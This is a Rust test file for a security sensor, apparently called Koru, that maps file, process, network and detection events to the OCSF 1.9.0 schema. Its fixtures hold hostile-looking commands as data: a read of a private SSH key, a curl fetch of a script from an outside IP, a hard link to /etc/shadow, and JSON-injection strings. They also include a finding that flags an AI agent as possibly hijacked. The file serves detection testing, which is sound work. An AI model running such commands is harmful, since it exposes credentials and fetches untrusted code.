//! OCSF mapping tests (protected set; ADR-0006 "OCSF
//! mapping"). The target version is OCSF 1.9.0.
//!
//! Two layers:
//! 1. Schema check: the mapping output is checked against a snapshot generated from the official
//!    schema API
//!    (`tests/data/ocsf-1.9.0-snapshot.json`, `tools/ocsf-snapshot-gen.py`): the class's required
//!    attributes are present, no attribute is absent from the schema (only `unmapped` is
//!    allowed), types and fixed value sets (`enum`) match, `at_least_one` constraints hold, and
//!    = `class_uid * 100 + activity_id`.
//! 2. The mapping table: event kind → class and activity, field-by-field values.

mod common;

use common::*;
use koru_event::{Event, UNTRUSTED_FIELDS};
use koru_store::{OCSF_VERSION, mask_event, ocsf_event};
use serde_json::{Value, json};

const SNAPSHOT: &str = include_str!("data/ocsf-1.9.0-snapshot.json");

fn snapshot() -> Value {
    serde_json::from_str(SNAPSHOT).expect("the snapshot is valid JSON")
}

fn check_object(snapshot: &Value, doc: &Value, value: &Value, path: &str, errors: &mut Vec<String>) {
    let Some(object) = value.as_object() else {
        errors.push(format!("{path}: expected object"));
        return;
    };
    let attributes = doc["attributes"].as_object().expect("attributes");
    for (name, v) in object {
        let Some(definition) = attributes.get(name) else {
            errors.push(format!("{path}/{name}: attribute absent from the schema"));
            continue;
        };
        check_attribute(snapshot, definition, v, &format!("{path}/{name}"), errors);
    }
    for z in doc["required"].as_array().unwrap() {
        if !object.contains_key(z.as_str().unwrap()) {
            errors.push(format!("{path}: missing required attribute: {z}"));
        }
    }
    let list = doc["at_least_one"].as_array().unwrap();
    if !list.is_empty() && !list.iter().any(|a| object.contains_key(a.as_str().unwrap())) {
        errors.push(format!("{path}: at least one of {list:?} must be present"));
    }
    let exact = doc["exactly_one"].as_array().unwrap();
    if !exact.is_empty() && exact.iter().filter(|a| object.contains_key(a.as_str().unwrap())).count() != 1 {
        errors.push(format!("{path}: exactly one of {exact:?} must be present"));
    }
}

fn check_attribute(snapshot: &Value, definition: &Value, v: &Value, path: &str, errors: &mut Vec<String>) {
    if definition["array"].as_bool().unwrap() {
        let Some(array) = v.as_array() else {
            errors.push(format!("{path}: expected array"));
            return;
        };
        for (i, item) in array.iter().enumerate() {
            check_single(snapshot, definition, item, &format!("{path}/{i}"), errors);
        }
    } else {
        check_single(snapshot, definition, v, path, errors);
    }
}

fn check_single(snapshot: &Value, definition: &Value, v: &Value, path: &str, errors: &mut Vec<String>) {
    let mode = definition["mode"].as_str().unwrap();
    let matches = match mode {
        "int" => v.is_i64() || v.is_u64(),
        "str" => v.is_string(),
        "bool" => v.is_boolean(),
        "float" => v.is_number(),
        "obj" => v.is_object(),
        _ => true,
    };
    if !matches {
        errors.push(format!("{path}: type {mode} expected: {v}"));
        return;
    }
    if let Some(enum_) = definition.get("enum") {
        let text = v.to_string();
        if !enum_.as_array().unwrap().iter().any(|e| e.as_str().unwrap() == text) {
            errors.push(format!("{path}: {text} is not in the fixed value set: {enum_}"));
        }
    }
    if let Some(doc) = definition.get("object").and_then(Value::as_str).and_then(|n| snapshot["objects"].get(n)) {
        check_object(snapshot, doc, v, path, errors);
    }
}

/// Checks the mapping output against the snapshot; the error list must be empty.
fn check_class(class: &str, v: &Value) -> Vec<String> {
    let a = snapshot();
    let doc = &a["classes"][class];
    let mut errors = Vec::new();
    check_object(&a, doc, v, "", &mut errors);
    if v["class_uid"] != doc["class_uid"] {
        errors.push(format!("class_uid {} != {}", v["class_uid"], doc["class_uid"]));
    }
    if v["category_uid"] != doc["category_uid"] {
        errors.push(format!("category_uid {} != {}", v["category_uid"], doc["category_uid"]));
    }
    let expected_type = v["class_uid"].as_i64().unwrap_or(0) * 100 + v["activity_id"].as_i64().unwrap_or(-1);
    if v["type_uid"].as_i64() != Some(expected_type) {
        errors.push(format!("type_uid {} != class_uid*100+activity_id ({expected_type})", v["type_uid"]));
    }
    errors
}

fn class_name(v: &Value) -> &'static str {
    match v["class_uid"].as_i64().unwrap() {
        1001 => "file_activity",
        1007 => "process_activity",
        4001 => "network_activity",
        2004 => "detection_finding",
        other => panic!("unexpected class {other}"),
    }
}

fn ocsf(template: &str) -> Value {
    ocsf_event(&event(template, 7))
}

#[test]
fn version_1_9_0() {
    assert_eq!(OCSF_VERSION, "1.9.0");
    assert_eq!(snapshot()["ocsf_version"], "1.9.0");
    for template in ALL_TEMPLATES {
        assert_eq!(ocsf(template)["metadata"]["version"], "1.9.0");
    }
}

#[test]
fn snapshot_carries_expected_classes_and_numbers() {
    let a = snapshot();
    for (name, uid, category) in [
        ("file_activity", 1001, 1),
        ("process_activity", 1007, 1),
        ("network_activity", 4001, 4),
        ("detection_finding", 2004, 2),
    ] {
        assert_eq!(a["classes"][name]["class_uid"], uid, "{name}");
        assert_eq!(a["classes"][name]["category_uid"], category, "{name}");
    }
}

#[test]
fn every_template_matches_the_ocsf_schema() {
    for template in ALL_TEMPLATES {
        let v = ocsf(template);
        let errors = check_class(class_name(&v), &v);
        assert!(errors.is_empty(), "{template}: {errors:#?}\n{v:#}");
    }
}

#[test]
fn masked_event_also_matches_the_ocsf_schema() {
    for (i, template) in ALL_TEMPLATES.iter().enumerate() {
        let v = ocsf_event(&mask_event(&event(template, i as u32)));
        let errors = check_class(class_name(&v), &v);
        assert!(errors.is_empty(), "{template}: {errors:#?}");
    }
}

#[test]
fn every_detected_event_kind_becomes_detection_finding() {
    for template in [
        "file_opened",
        "file_deleted",
        "file_renamed",
        "process_executed",
        "process_exited",
        "network_connection",
        "network_connection_v6",
        "network_accept",
    ] {
        let mut v = event_json_value(template, 3);
        v["detection"] =
            json!({"rule": "koru.test.rule", "decoy_id": null, "threat_class": "self_protection", "attack": ["T1562"]});
        let o: Event = serde_json::from_value(v).unwrap();
        let c = ocsf_event(&o);
        assert_eq!(c["class_uid"], 2004, "{template}");
        let errors = check_class("detection_finding", &c);
        assert!(errors.is_empty(), "{template}: {errors:#?}");
    }
}

#[test]
fn common_fields() {
    let o = event("file_opened", 7);
    let v = ocsf_event(&o);
    assert_eq!(v["metadata"]["product"]["name"], "Koru");
    assert_eq!(v["metadata"]["product"]["vendor_name"], "Koru");
    assert_eq!(v["metadata"]["uid"], o.event_id.to_string());
    assert_eq!(v["metadata"]["original_time"], o.timestamp.text());
    assert_eq!(v["metadata"]["labels"], json!(["source:synthetic"]));
    let ms = (o.timestamp.unix_nanos() / 1_000_000) as i64;
    assert_eq!(v["time"], ms, "time is in milliseconds");
    assert_eq!(v["severity_id"], 1);
    assert_eq!(v["device"], json!({"type_id": 0, "hostname": "lab-server"}));
    let koru = &v["unmapped"]["koru"];
    assert_eq!(koru["source_tag"], "synthetic");
    assert_eq!(koru["event_type"], "file_opened");
    assert_eq!(koru["timestamp_trusted"], true);
    assert_eq!(koru["schema_version"], 1);
    assert_eq!(koru["actor"]["kind"], "unknown");
    assert_eq!(koru["flags"], json!(["O_RDONLY"]));
    assert_eq!(koru["sensor"]["name"], "pulsar");
    assert_eq!(koru["untrusted_fields"], json!(UNTRUSTED_FIELDS));
}

#[test]
fn source_tag_in_metadata_labels_and_unmapped() {
    for e in ["synthetic", "legitimate", "real"] {
        let mut v = event_json_value("file_opened", 1);
        v["source_tag"] = json!(e);
        let o: Event = serde_json::from_value(v).unwrap();
        let c = ocsf_event(&o);
        assert_eq!(c["metadata"]["labels"], json!([format!("source:{e}")]));
        assert_eq!(c["unmapped"]["koru"]["source_tag"], e);
    }
}

#[test]
fn file_opened() {
    let v = ocsf("file_opened");
    assert_eq!(
        (&v["class_uid"], &v["category_uid"], &v["activity_id"], &v["type_uid"]),
        (&json!(1001), &json!(1), &json!(14), &json!(100114))
    );
    assert_eq!(v["file"]["path"], "/home/user/.ssh/id_ed25519");
    assert_eq!(v["file"]["name"], "id_ed25519");
    assert_eq!(v["file"]["type_id"], 0);
    let p = &v["actor"]["process"];
    assert_eq!(p["pid"], 1007);
    assert_eq!(p["name"], "cat");
    assert_eq!(p["cmd_line"], "cat /home/user/.ssh/id_ed25519");
    assert_eq!(p["file"]["path"], "/usr/bin/cat");
    assert_eq!(p["file"]["name"], "cat");
    assert_eq!(p["user"]["uid"], "1000");
    assert_eq!(p["created_time"], 1_791_560_874_537i64, "ms");
    assert_eq!(p["parent_process"]["pid"], 900);
    assert_eq!(p["parent_process"]["name"], "bash");
    assert_eq!(p["parent_process"]["parent_process"]["pid"], 1);
    assert_eq!(v["actor"]["user"]["uid"], "1000");
}

#[test]
fn file_created_deleted_and_directories() {
    let o = ocsf("file_created");
    assert_eq!((&o["activity_id"], &o["type_uid"]), (&json!(1), &json!(100101)));
    assert_eq!(o["file"]["name"], "file.txt");
    let s = ocsf("file_deleted");
    assert_eq!((&s["activity_id"], &s["type_uid"]), (&json!(4), &json!(100104)));
    let d = ocsf("directory_created");
    assert_eq!((&d["class_uid"], &d["activity_id"], &d["file"]["type_id"]), (&json!(1001), &json!(1), &json!(2)));
    let d = ocsf("directory_deleted");
    assert_eq!((&d["activity_id"], &d["file"]["type_id"]), (&json!(4), &json!(2)));
}

#[test]
fn file_renamed() {
    let v = ocsf("file_renamed");
    assert_eq!((&v["activity_id"], &v["type_uid"]), (&json!(5), &json!(100105)));
    assert_eq!(v["file"]["path"], "/var/tmp/old.txt");
    assert_eq!(v["file"]["name"], "old.txt");
    assert_eq!(v["file_result"]["path"], "/var/tmp/new.txt");
    assert_eq!(v["file_result"]["name"], "new.txt");
}

#[test]
fn file_link_as_other_activity() {
    let v = ocsf("file_link");
    assert_eq!((&v["class_uid"], &v["activity_id"], &v["type_uid"]), (&json!(1001), &json!(99), &json!(100199)));
    assert_eq!(v["activity_name"], "Link");
    assert_eq!(v["file"]["path"], "/var/tmp/connection");
    assert_eq!(v["file_result"]["path"], "/etc/shadow");
    assert_eq!(v["unmapped"]["koru"]["hard_link"], true);
}

#[test]
fn process_executed() {
    let v = ocsf("process_executed");
    assert_eq!(
        (&v["class_uid"], &v["category_uid"], &v["activity_id"], &v["type_uid"]),
        (&json!(1007), &json!(1), &json!(1), &json!(100701))
    );
    assert_eq!(v["launch_type_id"], 3);
    assert_eq!(v["process"]["pid"], 1007);
    assert_eq!(v["process"]["name"], "curl");
    assert_eq!(v["process"]["file"]["path"], "/usr/bin/curl");
    assert_eq!(v["process"]["cmd_line"], "curl http://203.0.113.9:8080/upload.sh");
    assert_eq!(v["actor"]["process"]["pid"], 1007);
}

#[test]
fn process_exited() {
    let v = ocsf("process_exited");
    assert_eq!((&v["class_uid"], &v["activity_id"], &v["type_uid"]), (&json!(1007), &json!(2), &json!(100702)));
    assert_eq!(v["exit_code"], 0);
    assert_eq!(v["process"]["pid"], 1007);
}

#[test]
fn outgoing_network_connection() {
    let v = ocsf("network_connection");
    assert_eq!(
        (&v["class_uid"], &v["category_uid"], &v["activity_id"], &v["type_uid"]),
        (&json!(4001), &json!(4), &json!(1), &json!(400101))
    );
    assert_eq!(v["dst_endpoint"], json!({"ip": "203.0.113.77", "port": 443}));
    assert_eq!(v["src_endpoint"], json!({"ip": "10.0.0.5", "port": 51234}));
    assert_eq!(
        v["connection_info"],
        json!({"direction_id": 2, "protocol_name": "tcp", "protocol_num": 6, "protocol_ver_id": 4})
    );
    assert_eq!(v["actor"]["process"]["pid"], 1007);
}

#[test]
fn ipv6_udp_connection_without_local() {
    let v = ocsf("network_connection_v6");
    assert_eq!(v["dst_endpoint"], json!({"ip": "2001:db8:abcd:12::99", "port": 53}));
    assert!(v.get("src_endpoint").is_none(), "without a local endpoint no src_endpoint is written");
    assert_eq!(
        v["connection_info"],
        json!({"direction_id": 2, "protocol_name": "udp", "protocol_num": 17, "protocol_ver_id": 6})
    );
}

#[test]
fn incoming_network_accept() {
    let v = ocsf("network_accept");
    assert_eq!((&v["class_uid"], &v["activity_id"], &v["type_uid"]), (&json!(4001), &json!(1), &json!(400101)));
    assert_eq!(v["src_endpoint"], json!({"ip": "198.51.100.7", "port": 40222}), "the initiator is the remote endpoint");
    assert_eq!(v["dst_endpoint"], json!({"ip": "10.0.0.5", "port": 22}));
    assert_eq!(v["connection_info"]["direction_id"], 1);
}

#[test]
fn detection_finding() {
    let o = event("finding", 7);
    let v = ocsf_event(&o);
    assert_eq!(
        (&v["class_uid"], &v["category_uid"], &v["activity_id"], &v["type_uid"]),
        (&json!(2004), &json!(2), &json!(1), &json!(200401))
    );
    assert_eq!(v["status_id"], 1);
    assert_eq!(v["is_alert"], true);
    assert_eq!(v["severity_id"], 5, "suspected_hijacked_agent is critical");
    let fi = &v["finding_info"];
    assert_eq!(fi["uid"], o.event_id.to_string());
    assert_eq!(fi["title"], "koru.decoy.ssh-private-key-read");
    assert_eq!(fi["types"], json!(["suspected_hijacked_agent"]));
    assert_eq!(fi["analytic"], json!({"name": "koru.decoy.ssh-private-key-read", "type_id": 1, "type": "Rule"}));
    assert_eq!(fi["created_time"], v["time"]);
    assert_eq!(
        fi["attacks"],
        json!([
            {"technique": {"uid": "T1552"}, "sub_technique": {"uid": "T1552.004"}},
            {"technique": {"uid": "T1005"}}
        ])
    );
    assert_eq!(v["unmapped"]["koru"]["decoy_id"], "decoy-0192a1");
    assert_eq!(v["unmapped"]["koru"]["tags"]["mitre_techniques"], json!(["T1552.004", "T1005"]));
    assert_eq!(v["unmapped"]["koru"]["actor"]["kind"], "ai_agent");
    let evidence = &v["evidences"][0];
    assert_eq!(evidence["file"]["path"], "/home/user/.ssh/id_ed25519");
    assert_eq!(evidence["process"]["pid"], 1007);
    assert_eq!(evidence["process"]["cmd_line"], "cat /home/user/.ssh/id_ed25519");
    assert!(!v["message"].as_str().unwrap_or("").is_empty());
}

#[test]
fn finding_network_carried_as_evidence() {
    let mut j = event_json_value("network_connection", 1);
    j["detection"] =
        json!({"rule": "koru.test.rule", "decoy_id": null, "threat_class": "breadcrumb_access", "attack": ["T1021"]});
    let o: Event = serde_json::from_value(j).unwrap();
    let v = ocsf_event(&o);
    assert_eq!(v["severity_id"], 2, "breadcrumb access is low");
    assert_eq!(v["evidences"][0]["dst_endpoint"]["ip"], "203.0.113.77");
    assert_eq!(v["evidences"][0]["src_endpoint"]["ip"], "10.0.0.5");
    assert!(v["unmapped"]["koru"]["decoy_id"].is_null());
}

#[test]
fn severity_by_threat_class() {
    for (class, expected) in
        [("decoy_access", 4), ("breadcrumb_access", 2), ("suspected_hijacked_agent", 5), ("self_protection", 4)]
    {
        let mut j = event_json_value("file_opened", 1);
        j["detection"] = json!({"rule": "k", "decoy_id": null, "threat_class": class, "attack": ["T1005"]});
        let o: Event = serde_json::from_value(j).unwrap();
        assert_eq!(ocsf_event(&o)["severity_id"], expected, "{class}");
    }
}

#[test]
fn root_file_path_name() {
    let mut j = event_json_value("file_opened", 1);
    j["target"]["path"] = json!("/");
    let o: Event = serde_json::from_value(j).unwrap();
    let v = ocsf_event(&o);
    assert_eq!(v["file"]["name"], "/");
    assert!(check_class("file_activity", &v).is_empty());
}

#[test]
fn container_info_kept_in_unmapped() {
    let v = ocsf("containerized");
    assert_eq!(v["unmapped"]["koru"]["container"]["name"], "silly_cartwright");
    assert_eq!(
        v["unmapped"]["koru"]["container"]["id"],
        "ac723a96d4435aa4f5e400cafd7a9152b565e49c810a74f0b6485e2cef06506f"
    );
}

#[test]
fn attacker_data_only_in_values_in_mapping() {
    // Attacker text is carried only as a value, never as an attribute name (JSON injection).
    let mut j = event_json_value("file_opened", 1);
    j["target"]["path"] = json!("/tmp/\",\"severity_id\":99,\"x\":\"");
    j["process"]["command_line"] = json!(["a\"}, \"class_uid\": 1"]);
    let o: Event = serde_json::from_value(j).unwrap();
    let v = ocsf_event(&o);
    assert_eq!(v["severity_id"], 1);
    assert_eq!(v["class_uid"], 1001);
    let text = serde_json::to_string(&v).unwrap();
    let back: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(back, v, "serialization must round-trip unchanged");
    assert!(check_class("file_activity", &v).is_empty());
}
